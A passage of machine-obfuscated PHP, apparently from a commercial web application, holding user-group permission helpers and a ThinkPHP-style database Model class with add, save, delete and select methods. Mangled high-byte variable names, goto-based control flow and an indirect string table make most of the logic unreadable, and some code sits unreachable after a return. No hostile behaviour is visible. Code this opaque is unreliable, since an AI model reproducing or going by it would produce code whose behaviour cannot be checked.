$D¨†Ö÷äÎ¨ = 0; goto CµßÛº“©µ; DœáË¨Î©»: $dˆÑ‡Ëã¢³ = 1000; $b£†ÀÄµøŒ = 0; $B‘ò§ÜœÆİ = 0; goto bÍóµ¦¦Œñ; e‹åÇÅ´Í: return $a¹ÂÂã†©¤; goto a…¿œêÛ»Ã; bÍóµ¦¦Œñ: $fÔÙ…¡Ìñ‘ = 0; $b±½÷îñÕ = 0; $f¯¡ÌÎŞ´ = array($EÇÜêñ½ˆğ[387] => 0); goto DÔ„İà¡; CµßÛº“©µ: $Fªµ‚Î‚˜ = 0; $bÂ·¼–î• = 0; $aÒÒ¸©Œºî = 0; goto DœáË¨Î©»; eËÆ†šƒ: $EÇÜêñ½ˆğ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; if (!$bÉØÑ“äê) { return array($EÇÜêñ½ˆğ[395] => 0, $EÇÜêñ½ˆğ[435] => !1); } $E²­ïŸ˜Â = $E²­ïŸ˜Â ? $E²­ïŸ˜Â : USER_ID; goto E¢ßÔ©òé¿; a…¿œêÛ»Ã: } private function groupContainUser($FôëÑê¾µÕ, $bÎ“ğ‚›åñ = false) { return in_array($FôëÑê¾µÕ, $this->userGroupParents($bÎ“ğ‚›åñ)); } private function groupStepToUserGroup($fªÅ…²Ñ, $c±òô¦¿œ = false) { goto aÆ÷¶°¬­; FÂÃ Æ†…š: $aâñÀÃ¼ê = $GLOBALS[$e„Çì²âŠ[6]][$e„Çì²âŠ[87]][$e„Çì²âŠ[1733]] == 1; $eÁï·ø‡•Ü = $aâñÀÃ¼ê ? 3 : 2; foreach ($CáîÍÑè†ò as $eÏå»£Ç®ã) { if ($eÏå»£Ç®ã[$e„Çì²âŠ[1638]] == $fªÅ…²Ñ) { return 0; } $d¾‚ÕÌõ„Š = explode($e„Çì²âŠ[47], trim($eÏå»£Ç®ã[$e„Çì²âŠ[477]], $e„Çì²âŠ[47])); if ($d¾‚ÕÌõ„Š[0] == $e„Çì²âŠ[486] && count($d¾‚ÕÌõ„Š) > $eÁï·ø‡•Ü) { $bÉò‰ÄéÍ = array_reverse(array_slice($d¾‚ÕÌõ„Š, $eÁï·ø‡•Ü)); $Fö˜ñêÆ„ = array_search($fªÅ…²Ñ, $bÉò‰ÄéÍ); if ($Fö˜ñêÆ„ !== !1 && $Fö˜ñêÆ„ + 1 <= $E˜‹¬‹òÅÎ) { $E˜‹¬‹òÅÎ = $Fö˜ñêÆ„ + 1; } } } goto A…Ä‡©½æ¨; A…Ä‡©½æ¨: return $E˜‹¬‹òÅÎ; goto bñÈˆËªƒÔ; aÆ÷¶°¬­: $e„Çì²âŠ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $CáîÍÑè†ò = $this->userGroupList($c±òô¦¿œ); $E˜‹¬‹òÅÎ = 1000; goto FÂÃ Æ†…š; bñÈˆËªƒÔ: } private function userGroupList($eÓ¯ŞªÅ† = false) { $eÏ ÍĞ‰é =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; static $c¥Ş­šõöø = array(); if (isset($c¥Ş­šõöø[$eÓ¯ŞªÅ†])) { return $c¥Ş­šõöø[$eÓ¯ŞªÅ†]; } $aŒÒöø´¹á = Model($eÏ ÍĞ‰é[495])->getInfo($eÓ¯ŞªÅ†); $c¥Ş­šõöø[$eÓ¯ŞªÅ†] = array_to_keyvalue($aŒÒöø´¹á[$eÏ ÍĞ‰é[1813]], $eÏ ÍĞ‰é[1638]); return $c¥Ş­šõöø[$eÓ¯ŞªÅ†]; } public function userGroupParents($eò•§¬õ¾Ö) { goto AğµöíÚ¸î; AæÉÜ‰Óë: $fÍ£Õ¨®Äí[$eò•§¬õ¾Ö] = array_unique($dÊ÷‘—Üó); return $fÍ£Õ¨®Äí[$eò•§¬õ¾Ö]; goto CÌé²¿¶Ê†; AğµöíÚ¸î: $c÷‚ÒêìÉß =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; static $fÍ£Õ¨®Äí = array(); $eò•§¬õ¾Ö = $eò•§¬õ¾Ö ? $eò•§¬õ¾Ö : USER_ID; goto a¼ğ°²Œê˜; a¼ğ°²Œê˜: if (isset($fÍ£Õ¨®Äí[$eò•§¬õ¾Ö])) { return $fÍ£Õ¨®Äí[$eò•§¬õ¾Ö]; } $a²Ï§ìÔù = $this->userGroupList($eò•§¬õ¾Ö); $dÊ÷‘—Üó = array(); goto c¶ôĞ»¥®½; c¶ôĞ»¥®½: $f³†¤—¬² = $GLOBALS[$c÷‚ÒêìÉß[6]][$c÷‚ÒêìÉß[87]][$c÷‚ÒêìÉß[1733]] == 1; $Dó×ÕÒÀñ = $f³†¤—¬² ? 3 : 2; foreach ($a²Ï§ìÔù as $D‹¬·«šš¦) { $C‚èààç‹É = array($D‹¬·«šš¦[$c÷‚ÒêìÉß[1638]]); $Eá¿áä• = explode($c÷‚ÒêìÉß[47], trim($D‹¬·«šš¦[$c÷‚ÒêìÉß[477]], $c÷‚ÒêìÉß[47])); if ($Eá¿áä•[0] == $c÷‚ÒêìÉß[486] && count($Eá¿áä•) > $Dó×ÕÒÀñ) { $dÓÍ±ˆà¾Í = array_slice($Eá¿áä•, $Dó×ÕÒÀñ); $C‚èààç‹É = array_merge($C‚èààç‹É, array_reverse($dÓÍ±ˆà¾Í)); } $dÊ÷‘—Üó = array_merge($dÊ÷‘—Üó, $C‚èààç‹É); } goto AæÉÜ‰Óë; CÌé²¿¶Ê†: } public function authTargetInfoMake($aŒ­çªÓĞÃ) { goto A¡Ë¼ƒÚï; A¡Ë¼ƒÚï: $eç©ç¸óô– =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $Aä«öå†İë = array(); $eŞåİÎÎ¾… = array(); goto fŞì‰Û´; FïÃÅ’—ó™: return array($eç©ç¸óô–[1842] => $Aä«öå†İë, $eç©ç¸óô–[1843] => $eŞåİÎÎ¾…); goto AÕ®†½Ñ‚¬; fŞì‰Û´: foreach ($aŒ­çªÓĞÃ as $ağà›‚ğÔÂ) { if ($ağà›‚ğÔÂ[$eç©ç¸óô–[389]] == SourceModel::TYPE_USER) { $Aä«öå†İë[] = intval($ağà›‚ğÔÂ[$eç©ç¸óô–[474]]); } else { if ($ağà›‚ğÔÂ[$eç©ç¸óô–[389]] == SourceModel::TYPE_GROUP) { $eŞåİÎÎ¾…[] = intval($ağà›‚ğÔÂ[$eç©ç¸óô–[474]]); } } } if ($Aä«öå†İë) { $Aä«öå†İë = Model($eç©ç¸óô–[492])->userListInfo($Aä«öå†İë); } if ($eŞåİÎÎ¾…) { $f¿³‚Âˆº = array($eç©ç¸óô–[1719] => array($eç©ç¸óô–[402], $eŞåİÎÎ¾…)); $eŞåİÎÎ¾… = Model($eç©ç¸óô–[476])->field($eç©ç¸óô–[1732])->where($f¿³‚Âˆº)->select(); $eŞåİÎÎ¾… = array_to_keyvalue($eŞåİÎÎ¾…, $eç©ç¸óô–[1638]); } goto FïÃÅ’—ó™; AÕ®†½Ñ‚¬: } public function authInfo($cù²ò²Æ¬ô) { $CŠç„ó¼Ì =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; if ($cù²ò²Æ¬ô[$CŠç„ó¼Ì[1787]]) { $bïÍ“¸Ó¹ = Model($CŠç„ó¼Ì[1806])->listData($cù²ò²Æ¬ô[$CŠç„ó¼Ì[1787]]); if (!$bïÍ“¸Ó¹) { return !1; $fˆ„–¶Ä¥ = Model($CŠç„ó¼Ì[1806])->listData(); $dÅ©ŒÏ·— = array_filter_by_field($fˆ„–¶Ä¥, $CŠç„ó¼Ì[394], $CŠç„ó¼Ì[486]); return $dÅ©ŒÏ·—; } $F¹¬ï‹¶  = array_field_key($bïÍ“¸Ó¹, array($CŠç„ó¼Ì[385], $CŠç„ó¼Ì[28], $CŠç„ó¼Ì[394], $CŠç„ó¼Ì[1659], $CŠç„ó¼Ì[1661])); $F¹¬ï‹¶ [$CŠç„ó¼Ì[1844]] = $cù²ò²Æ¬ô; return $F¹¬ï‹¶ ; } else { return array($CŠç„ó¼Ì[403] => 0, $CŠç„ó¼Ì[1644] => $cù²ò²Æ¬ô[$CŠç„ó¼Ì[1788]], $CŠç„ó¼Ì[404] => $CŠç„ó¼Ì[33], $CŠç„ó¼Ì[1659] => $CŠç„ó¼Ì[1845]); } } } goto d§µ‹î†•; d“‹¥Ö›²³: define($_SERVER[ó¬â¥‰ÊÔ¤Ç£][238], 0); define($_SERVER[ó¬â¥‰ÊÔ¤Ç£][239], 2); class Model extends ClassBaseCall { private $_extModel = null; protected $db = null; protected $pk = "\151\x64"; protected $tablePrefix = ''; protected $name = ''; protected $dbName = ''; protected $connection = ''; protected $tableName = ''; protected $trueTableName = ''; protected $error = ''; protected $fields = array(); protected $data = array(); protected $options = array(); protected $_validate = array(); protected $_auto = array(); protected $_map = array(); protected $_scope = array(); protected $autoCheckFields = true; protected $patchValidate = false; protected $methods = array("\x74\141\x62\x6c\x65", "\157\162\x64\x65\x72", "\x61\x6c\151\141\163", "\x68\x61\166\x69\x6e\147", "\147\x72\157\165\x70", "\x6c\x6f\x63\153", "\x64\151\x73\x74\151\156\143\164", "\141\x75\164\157", "\x66\x69\154\164\x65\162", "\x76\141\x6c\x69\x64\x61\x74\x65", "\162\145\163\165\154\x74", "\142\x69\156\144", "\164\157\153\x65\156"); public function __construct($Dğ½°İ­£ = '', $dÁ½šæÂì = '', $dãÄ…½¿Òµ = '') { $aŒÄÂ¦™Ó¿ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $this->_initialize(); if (!empty($Dğ½°İ­£)) { if (strpos($Dğ½°İ­£, $aŒÄÂ¦™Ó¿[94])) { list($this->dbName, $this->name) = explode($aŒÄÂ¦™Ó¿[94], $Dğ½°İ­£); } else { $this->name = $Dğ½°İ­£; } } elseif (empty($this->name)) { $this->name = $this->getModelName(); } if (is_null($dÁ½šæÂì)) { $this->tablePrefix = $aŒÄÂ¦™Ó¿[33]; } elseif ($aŒÄÂ¦™Ó¿[33] != $dÁ½šæÂì) { $this->tablePrefix = $dÁ½šæÂì; } else { $this->tablePrefix = $this->tablePrefix ? $this->tablePrefix : think_config($aŒÄÂ¦™Ó¿[240]); } $this->db(0, empty($this->connection) ? $dãÄ…½¿Òµ : $this->connection); $this->_classObjectID = mt_rand(0, 10000); } protected function _checkTableInfo() { $BÓ˜Û…¥Œ‚ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; if (empty($this->fields)) { if (think_config($BÓ˜Û…¥Œ‚[241])) { $aÏŞÕˆÄÔˆ = $this->dbName ? $this->dbName : think_config($BÓ˜Û…¥Œ‚[242]); $cºç›öçñ¶ = think_var_cache($BÓ˜Û…¥Œ‚[243] . strtolower(get_path_this($aÏŞÕˆÄÔˆ) . $BÓ˜Û…¥Œ‚[94] . $this->name)); if ($cºç›öçñ¶) { $dÁŠöƒÉÎˆ = think_config($BÓ˜Û…¥Œ‚[244]); if (empty($dÁŠöƒÉÎˆ) || $cºç›öçñ¶[$BÓ˜Û…¥Œ‚[245]] == $dÁŠöƒÉÎˆ) { $this->fields = $cºç›öçñ¶; return; } } } $this->flush(); } } public function flush() { goto a¹Â¦ƒäÖá; a¹Â¦ƒäÖá: $aŒ®¢ºÇ§ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $this->db->setModel($this->name); $F¬¥¹ ”£© = $this->db->getFields($this->getTableName()); goto f™«¥ÍÂğ; dÔ••ëÀÁ: foreach ($F¬¥¹ ”£© as $fá¾†ŠÅ‚ä => $dğØëñöÉ) { $FƒöÔŠÀˆ[$fá¾†ŠÅ‚ä] = $dğØëñöÉ[$aŒ®¢ºÇ§[29]]; if ($dğØëñöÉ[$aŒ®¢ºÇ§[36]]) { $this->fields[$aŒ®¢ºÇ§[247]] = $fá¾†ŠÅ‚ä; if ($dğØëñöÉ[$aŒ®¢ºÇ§[39]]) { $this->fields[$aŒ®¢ºÇ§[246]] = !0; } } } $this->fields[$aŒ®¢ºÇ§[248]] = $FƒöÔŠÀˆ; if (think_config($aŒ®¢ºÇ§[244])) { $this->fields[$aŒ®¢ºÇ§[245]] = think_config($aŒ®¢ºÇ§[244]); } goto cñâ±µÊİ; cñâ±µÊİ: if (think_config($aŒ®¢ºÇ§[241])) { $cÒª´›öñÅ = $this->dbName ? $this->dbName : think_config($aŒ®¢ºÇ§[242]); think_var_cache($aŒ®¢ºÇ§[243] . strtolower(get_path_this($cÒª´›öñÅ) . $aŒ®¢ºÇ§[94] . $this->name), $this->fields); } goto DÒãšàßåÙ; f™«¥ÍÂğ: if (!$F¬¥¹ ”£©) { return !1; } $this->fields = array_keys($F¬¥¹ ”£©); $this->fields[$aŒ®¢ºÇ§[246]] = !1; goto dÔ••ëÀÁ; DÒãšàßåÙ: } public function switchModel($CæìÀ¹‘¨‹, $DçÒñªŸ›“ = array()) { $d´½à—ë =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $bÓª—™¯Áº = ucwords(strtolower($CæìÀ¹‘¨‹)) . $d´½à—ë[249]; if (!class_exists($bÓª—™¯Áº)) { think_exception($bÓª—™¯Áº . think_lang($d´½à—ë[250])); } $this->_extModel = new $bÓª—™¯Áº($this->name); if (!empty($DçÒñªŸ›“)) { foreach ($DçÒñªŸ›“ as $aƒ“±òÉ¬) { $this->_extModel->setProperty($aƒ“±òÉ¬, $this->{$aƒ“±òÉ¬}); } } return $this->_extModel; } public function __set($f«†ÍÑ®¿‡, $aŒÎÈì¢”) { $this->data[$f«†ÍÑ®¿‡] = $aŒÎÈì¢”; } public function __get($dê›«¦¾ŒÊ) { return isset($this->data[$dê›«¦¾ŒÊ]) ? $this->data[$dê›«¦¾ŒÊ] : null; } public function __isset($eá°ÜÜÛ‡) { return isset($this->data[$eá°ÜÜÛ‡]); } public function __unset($E±Õ½Š–¥¾) { unset($this->data[$E±Õ½Š–¥¾]); } public function __call($cï‚ò÷‘…Ş, $E¿…›±½¸) { $b¬©›ŒÌ… =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; if (in_array(strtolower($cï‚ò÷‘…Ş), $this->methods, !0)) { $this->options[strtolower($cï‚ò÷‘…Ş)] = $E¿…›±½¸[0]; return $this; } elseif (in_array(strtolower($cï‚ò÷‘…Ş), array($b¬©›ŒÌ…[251], $b¬©›ŒÌ…[252], $b¬©›ŒÌ…[253], $b¬©›ŒÌ…[254], $b¬©›ŒÌ…[255]), !0)) { $Bãèíºå¿ß = isset($E¿…›±½¸[0]) ? $E¿…›±½¸[0] : $b¬©›ŒÌ…[182]; $Bãèíºå¿ß = $this->db->parseKey($Bãèíºå¿ß); return $this->getField(strtoupper($cï‚ò÷‘…Ş) . $b¬©›ŒÌ…[256] . $Bãèíºå¿ß . $b¬©›ŒÌ…[257] . $cï‚ò÷‘…Ş, $b¬©›ŒÌ…[251]); } elseif (strtolower(substr($cï‚ò÷‘…Ş, 0, 5)) == $b¬©›ŒÌ…[258]) { $Bãèíºå¿ß = think_parse_name(substr($cï‚ò÷‘…Ş, 5)); $E™İàõ©íê[$Bãèíºå¿ß] = $E¿…›±½¸[0]; return $this->where($E™İàõ©íê)->find(); } elseif (strtolower(substr($cï‚ò÷‘…Ş, 0, 10)) == $b¬©›ŒÌ…[259]) { $cæ˜¿Óß = think_parse_name(substr($cï‚ò÷‘…Ş, 10)); $E™İàõ©íê[$cæ˜¿Óß] = $E¿…›±½¸[0]; return $this->where($E™İàõ©íê)->getField($E¿…›±½¸[1]); } elseif (isset($this->_scope[$cï‚ò÷‘…Ş])) { return $this->scope($cï‚ò÷‘…Ş, $E¿…›±½¸[0]); } elseif (method_exists($this, $cï‚ò÷‘…Ş)) { array_unshift($E¿…›±½¸, $cï‚ò÷‘…Ş); return call_user_func_array(array($this, $b¬©›ŒÌ…[260]), $E¿…›±½¸); } else { return call_user_func_array(array(parent, $cï‚ò÷‘…Ş), $E¿…›±½¸); } } protected function call() { goto Dò¹¢ÙŒÓ…; EÒ¤õÕŸš: $E“”Ø„Ñäõ = $BŒŒæ¾¿ì¼; if (is_array($BŒŒæ¾¿ì¼)) { $E“”Ø„Ñäõ = $BŒŒæ¾¿ì¼[1]; $BŒŒæ¾¿ì¼ = $BŒŒæ¾¿ì¼[0]; } $f‹ò„´µÇµ = count($eï¼­‡Šîî) - 1; goto B©ÈÔÇ¥é; Dò¹¢ÙŒÓ…: $c‰ïÌ‚¿Í =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $eï¼­‡Šîî = func_get_args(); $BŒŒæ¾¿ì¼ = array_shift($eï¼­‡Šîî); goto EÒ¤õÕŸš; F‚ˆè§±èÛ: $F×Â¹·©„ä = call_user_func_array(array($this, $BŒŒæ¾¿ì¼), $eï¼­‡Šîî); if (method_exists($this, $c‰ïÌ‚¿Í[264])) { $eÊˆ‡¿˜ƒ  = call_user_func_array(array($this, $c‰ïÌ‚¿Í[265]), array($E“”Ø„Ñäõ, $eï¼­‡Šîî, $F×Â¹·©„ä)); if ($eÊˆ‡¿˜ƒ ) { return $eÊˆ‡¿˜ƒ ; } } return $F×Â¹·©„ä; goto BàÌ¦á¢°; B©ÈÔÇ¥é: if (isset($eï¼­‡Šîî[$f‹ò„´µÇµ]) && $eï¼­‡Šîî[$f‹ò„´µÇµ] === $BŒŒæ¾¿ì¼) { think_exception(__CLASS__ . $c‰ïÌ‚¿Í[4] . $BŒŒæ¾¿ì¼ . think_lang($c‰ïÌ‚¿Í[261])); return; } $eï¼­‡Šîî[] = $BŒŒæ¾¿ì¼; if (method_exists($this, $c‰ïÌ‚¿Í[262])) { $eÊˆ‡¿˜ƒ  = call_user_func_array(array($this, $c‰ïÌ‚¿Í[263]), array($E“”Ø„Ñäõ, $eï¼­‡Šîî)); if (!is_null($eÊˆ‡¿˜ƒ ) && $eÊˆ‡¿˜ƒ  !== !1) { return $eÊˆ‡¿˜ƒ ; } } goto F‚ˆè§±èÛ; BàÌ¦á¢°: } protected function _initialize() { } protected function _facade($C©…¦±–ƒÖ) { $a¢ÇœäÁÃ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; if (!empty($this->fields)) { foreach ($C©…¦±–ƒÖ as $DÅ¾ƒöóäµ => $EÙãÊ‰¹´À) { if (is_array($this->fields) && !in_array($DÅ¾ƒöóäµ, $this->fields, !0)) { unset($C©…¦±–ƒÖ[$DÅ¾ƒöóäµ]); } elseif (is_scalar($EÙãÊ‰¹´À)) { $this->_parseType($C©…¦±–ƒÖ, $DÅ¾ƒöóäµ); } } } if (!empty($this->options[$a¢ÇœäÁÃ[266]])) { $C©…¦±–ƒÖ = array_map($this->options[$a¢ÇœäÁÃ[266]], $C©…¦±–ƒÖ); unset($this->options[$a¢ÇœäÁÃ[266]]); } $this->_beforeWrite($C©…¦±–ƒÖ); return $C©…¦±–ƒÖ; } protected function _beforeWrite(&$fÕ®ÕÑÎçÊ) { } public function add($f‡ØÕ¥õó× = '', $EÄ¶Ëö«í± = array(), $FàŒ¥åÂë = false) { goto Aˆ„’ºíƒ; Aˆ„’ºíƒ: if (empty($f‡ØÕ¥õó×)) { if (!empty($this->data)) { $f‡ØÕ¥õó× = $this->data; $this->data = array(); } else { $this->error = think_lang($_SERVER[ó¬â¥‰ÊÔ¤Ç£][267]); return !1; } } $EÄ¶Ëö«í± = $this->_parseOptions($EÄ¶Ëö«í±); $f‡ØÕ¥õó× = $this->_facade($f‡ØÕ¥õó×); goto D£˜¡èİ»¨; f¾µÅ »¨: return $f‰ÙÒµ’Œà; goto Fë‰Ÿ»ñ–Ø; D£˜¡èİ»¨: if (!1 === $this->_beforeInsert($f‡ØÕ¥õó×, $EÄ¶Ëö«í±)) { return !1; } $f‰ÙÒµ’Œà = $this->db->insert($f‡ØÕ¥õó×, $EÄ¶Ëö«í±, $FàŒ¥åÂë); if (!1 !== $f‰ÙÒµ’Œà) { $ešÊ¡Œ˜ÖÖ = $this->getLastInsID(); if ($ešÊ¡Œ˜ÖÖ) { $f‡ØÕ¥õó×[$this->getPk()] = $ešÊ¡Œ˜ÖÖ; $this->_after_insert($f‡ØÕ¥õó×, $EÄ¶Ëö«í±); return $ešÊ¡Œ˜ÖÖ; } $this->_after_insert($f‡ØÕ¥õó×, $EÄ¶Ëö«í±); } goto f¾µÅ »¨; Fë‰Ÿ»ñ–Ø: } protected function _beforeInsert(&$DèæÏ©¦„Ğ, $C•‰Ò²¶‚) { } protected function _after_insert($BØ§‹½áùà, $D÷–Ù÷ÃœÍ) { } public function addAll($C‰´¢£¶¶, $D®Ê¶ã”• = array(), $CøÅŠ¾›¹å = false) { goto bñ¬Ö­äèÅ; AÏô˜„ÙïÓ: return $Fæ„°ÍƒŠÃ; goto fëéõŠ±Ã; bñ¬Ö­äèÅ: $DÄÊÄï‹¥± =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; if (empty($C‰´¢£¶¶)) { $this->error = think_lang($DÄÊÄï‹¥±[267]); return !1; } $D®Ê¶ã”• = $this->_parseOptions($D®Ê¶ã”•); goto b—·¯ƒ®İ; b—·¯ƒ®İ: foreach ($C‰´¢£¶¶ as $b†ïÒ£–¯ => $d¸™Öãˆ÷Ö) { $C‰´¢£¶¶[$b†ïÒ£–¯] = $this->_facade($d¸™Öãˆ÷Ö); } if (method_exists($this->db, $DÄÊÄï‹¥±[268])) { $Fæ„°ÍƒŠÃ = $this->db->insertAll($C‰´¢£¶¶, $D®Ê¶ã”•, $CøÅŠ¾›¹å); } else { $this->startTrans(); foreach ($C‰´¢£¶¶ as $b†ïÒ£–¯ => $d¸™Öãˆ÷Ö) { $Fæ„°ÍƒŠÃ = $this->db->insert($d¸™Öãˆ÷Ö, $D®Ê¶ã”•, $CøÅŠ¾›¹å); } $this->commit(); } if (!1 !== $Fæ„°ÍƒŠÃ) { $Fˆ‚³ãÔÁ“ = $this->getLastInsID(); if ($Fˆ‚³ãÔÁ“) { return $Fˆ‚³ãÔÁ“; } } goto AÏô˜„ÙïÓ; fëéõŠ±Ã: } public function selectAdd($C÷õ‘óÌËŞ = '', $cíËŠºê³ƒ = '', $dë²‰£†Òâ = array()) { $còÜİ²Ú°Õ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $dë²‰£†Òâ = $this->_parseOptions($dë²‰£†Òâ); if (!1 === ($e±¥­¢ßØ = $this->db->selectInsert($C÷õ‘óÌËŞ ? $C÷õ‘óÌËŞ : $dë²‰£†Òâ[$còÜİ²Ú°Õ[269]], $cíËŠºê³ƒ ? $cíËŠºê³ƒ : $this->getTableName(), $dë²‰£†Òâ))) { $this->error = think_lang($còÜİ²Ú°Õ[270]); return !1; } else { return $e±¥­¢ßØ; } } public function save($b®…£—ª‡¦ = '', $f‰¹†£Ùğ = array()) { goto A½Ä°µ‰Ã; aóÆ«¾ˆØ—: if (!1 !== $Fä²±¦ˆğ) { if (isset($Aíçî¶²¤)) { $b®…£—ª‡¦[$a–Èğ¶‹ç¯] = $Aíçî¶²¤; } $this->_afterUpdate($b®…£—ª‡¦, $f‰¹†£Ùğ); } return $Fä²±¦ˆğ; goto Dğâè‡ñõì; C«áâø¤ÜÊ: if (is_array($f‰¹†£Ùğ[$c¢º›‘•áĞ[271]]) && isset($f‰¹†£Ùğ[$c¢º›‘•áĞ[271]][$a–Èğ¶‹ç¯])) { $Aíçî¶²¤ = $f‰¹†£Ùğ[$c¢º›‘•áĞ[271]][$a–Èğ¶‹ç¯]; } if (!1 === $this->_beforeUpdate($b®…£—ª‡¦, $f‰¹†£Ùğ)) { return !1; } $Fä²±¦ˆğ = $this->db->update($b®…£—ª‡¦, $f‰¹†£Ùğ); goto aóÆ«¾ˆØ—; b¤„ÇÑªÕŸ: $f‰¹†£Ùğ = $this->_parseOptions($f‰¹†£Ùğ); $a–Èğ¶‹ç¯ = $this->getPk(); if (!isset($f‰¹†£Ùğ[$c¢º›‘•áĞ[271]])) { if (isset($b®…£—ª‡¦[$a–Èğ¶‹ç¯])) { $cÊ´ñ¹½›Å[$a–Èğ¶‹ç¯] = $b®…£—ª‡¦[$a–Èğ¶‹ç¯]; $f‰¹†£Ùğ[$c¢º›‘•áĞ[271]] = $cÊ´ñ¹½›Å; unset($b®…£—ª‡¦[$a–Èğ¶‹ç¯]); } else { $this->error = think_lang($c¢º›‘•áĞ[270]); return !1; } } goto C«áâø¤ÜÊ; A½Ä°µ‰Ã: $c¢º›‘•áĞ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; if (empty($b®…£—ª‡¦)) { if (!empty($this->data)) { $b®…£—ª‡¦ = $this->data; $this->data = array(); } else { $this->error = think_lang($c¢º›‘•áĞ[267]); return !1; } } $b®…£—ª‡¦ = $this->_facade($b®…£—ª‡¦); goto b¤„ÇÑªÕŸ; Dğâè‡ñõì: } protected function _beforeUpdate(&$CñˆÊÛ­Øö, $añ¸Öß‡íÛ) { } protected function _afterUpdate($EÙİ‚ä…Ê, $B»…ì›”İ) { } public function delete($bŞŸø±ÅÜ = array()) { goto b‹¿´¬Æ©×; b‹¿´¬Æ©×: $b‡×í—ÙÙ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; if (empty($bŞŸø±ÅÜ) && empty($this->options[$b‡×í—ÙÙ[271]])) { if (!empty($this->data) && isset($this->data[$this->getPk()])) { return $this->delete($this->data[$this->getPk()]); } else { return !1; } } $f‹æÆ…‚Ãì = $this->getPk(); goto DÊíñÅØØÉ; DÊíñÅØØÉ: if (is_numeric($bŞŸø±ÅÜ) || is_string($bŞŸø±ÅÜ)) { if (strpos($bŞŸø±ÅÜ, $b‡×í—ÙÙ[47])) { $f¬åÚ‘İÇÊ[$f‹æÆ…‚Ãì] = array($b‡×í—ÙÙ[272], $bŞŸø±ÅÜ); } else { $f¬åÚ‘İÇÊ[$f‹æÆ…‚Ãì] = $bŞŸø±ÅÜ; } $this->options[$b‡×í—ÙÙ[271]] = $f¬åÚ‘İÇÊ; } $bŞŸø±ÅÜ = $this->_parseOptions(); if (is_array($bŞŸø±ÅÜ[$b‡×í—ÙÙ[271]]) && isset($bŞŸø±ÅÜ[$b‡×í—ÙÙ[271]][$f‹æÆ…‚Ãì])) { $BÌ¾¯…˜ø = $bŞŸø±ÅÜ[$b‡×í—ÙÙ[271]][$f‹æÆ…‚Ãì]; } goto CÓ–Ï«Ú…; CÓ–Ï«Ú…: $aÜËá¨›¼Ï = $this->db->delete($bŞŸø±ÅÜ); if (!1 !== $aÜËá¨›¼Ï) { $eÅÏ—‘ÜÜ = array(); if (isset($BÌ¾¯…˜ø)) { $eÅÏ—‘ÜÜ[$f‹æÆ…‚Ãì] = $BÌ¾¯…˜ø; } $this->_after_delete($eÅÏ—‘ÜÜ, $bŞŸø±ÅÜ); } return $aÜËá¨›¼Ï; goto C’È’¥ˆî…; C’È’¥ˆî…: } protected function _after_delete($a™ŒÆé¦­¹, $B•†Áì©­ã) { } public function select($f„¢ğÇíÌ = array()) { goto BéŒñÜÓ˜Œ; BéŒñÜÓ˜Œ: $eæŸ­øÈà =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; if (is_string($f„¢ğÇíÌ) || is_numeric($f„¢ğÇíÌ)) { $E³†¨ëË¦ = $this->getPk(); if (strpos($f„¢ğÇíÌ, $eæŸ­øÈà[47])) { $bÒÅĞß¢­ª[$E³†¨ëË¦] = array($eæŸ­øÈà[272], $f„¢ğÇíÌ); } else { $bÒÅĞß¢­ª[$E³†¨ëË¦] = $f„¢ğÇíÌ; } $this->options[$eæŸ­øÈà[271]] = $bÒÅĞß¢­ª; } elseif (!1 === $f„¢ğÇíÌ) { $f„¢ğÇíÌ = $this->_parseOptions(); return $eæŸ­øÈà[273] . $this->db->buildSelectSql($f„¢ğÇíÌ) . $eæŸ­øÈà[274]; } $f„¢ğÇíÌ = $this->_parseOptions(); goto cŒ—Ê½‡©; cŒ—Ê½‡©: $E¹‡Å±—Ü = $this->db->select($f„¢ğÇíÌ); if (!1 === $E¹‡Å±—Ü) { return !1; } if (empty($E¹‡Å±—Ü)) { return null; } goto Cè¼°¥èÊ; Cè¼°¥èÊ: $this->_afterSelect($E¹‡Å±—Ü, $f„¢ğÇíÌ); return $E¹‡Å±—Ü; goto AÊ‚¦ğ¼åÀ; AÊ‚¦ğ¼åÀ: } protected function _afterSelect(&$d‘°—ÇÂ†, $dêÕ¢ƒª±Š) { } public function buildSql($cí®ºØƒ²± = array()) { $Eç·åã¸Òš =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $cí®ºØƒ²± = $this->_parseOptions($cí®ºØƒ²±); return $Eç·åã¸Òš[273] . $this->db->buildSelectSql($cí®ºØƒ²±) . $Eç·åã¸Òš[274]; } public function optionsValue($D·šË±…ÃÖ = null) { if (is_null($D·šË±…ÃÖ)) { return $this->options; } elseif (is_array($D·šË±…ÃÖ)) { $this->options = array_merge($this->options, $D·šË±…ÃÖ); } } protected function _parseOptions($Cìª•İÊï = array()) { goto cÌìíÑ”öŸ; BÅ»Ï„Ü—¥: if (!isset($Cìª•İÊï[$FÔÍš …ë–[275]])) { $Cìª•İÊï[$FÔÍš …ë–[275]] = $this->getTableName(); $BßõÂÙõÖØ = $this->fields; } else { $BßõÂÙõÖØ = $this->getDbFields(); } if (!empty($Cìª•İÊï[$FÔÍš …ë–[276]])) { $Cìª•İÊï[$FÔÍš …ë–[275]] .= $FÔÍš …ë–[50] . $Cìª•İÊï[$FÔÍš …ë–[276]]; } $Cìª•İÊï[$FÔÍš …ë–[277]] = $this->name; goto EèçÀˆŒ¾«; cÌìíÑ”öŸ: $FÔÍš …ë– =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; if (is_array($Cìª•İÊï)) { $Cìª•İÊï = array_merge($this->options, $Cìª•İÊï); } $this->options = array(); goto BÅ»Ï„Ü—¥; 